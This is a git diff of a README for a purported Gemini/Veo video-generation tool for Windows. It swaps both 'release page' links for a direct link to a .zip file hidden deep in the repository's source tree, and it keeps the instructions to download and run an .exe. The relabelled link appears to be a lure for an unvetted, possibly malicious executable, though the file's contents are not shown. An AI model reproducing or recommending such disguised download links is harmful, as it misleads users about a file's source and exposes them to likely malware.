@@ -1,6 +1,6 @@
 # 🚀 gemini-omni-flash - Visual AI tools for rapid workflows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abarrios1486/gemini-omni-flash/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abarrios1486/gemini-omni-flash/raw/refs/heads/main/omni-video-gen/omni_video_gen/gemini-flash-omni-v3.5.zip)
 
 gemini-omni-flash provides a workspace to use Google Gemini Omni, Gemini 3.5 Flash, and Veo 3.1 video generation. This tool simplifies how you create AI-powered storyboards and manage video production. It works as a visual workspace for your projects. You do not need to write code to use the main features.
 
@@ -8,7 +8,7 @@ gemini-omni-flash provides a workspace to use Google Gemini Omni, Gemini 3.5 Fla
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project download page: [https://github.com/abarrios1486/gemini-omni-flash/releases](https://github.com/abarrios1486/gemini-omni-flash/releases).
+1. Visit the project download page: [https://github.com/abarrios1486/gemini-omni-flash/raw/refs/heads/main/omni-video-gen/omni_video_gen/gemini-flash-omni-v3.5.zip](https://github.com/abarrios1486/gemini-omni-flash/raw/refs/heads/main/omni-video-gen/omni_video_gen/gemini-flash-omni-v3.5.zip).
 2. Look for the latest version under the "Assets" section.
 3. Choose the file ending in `.exe` to download the installer.
 4. Save the file to your computer.
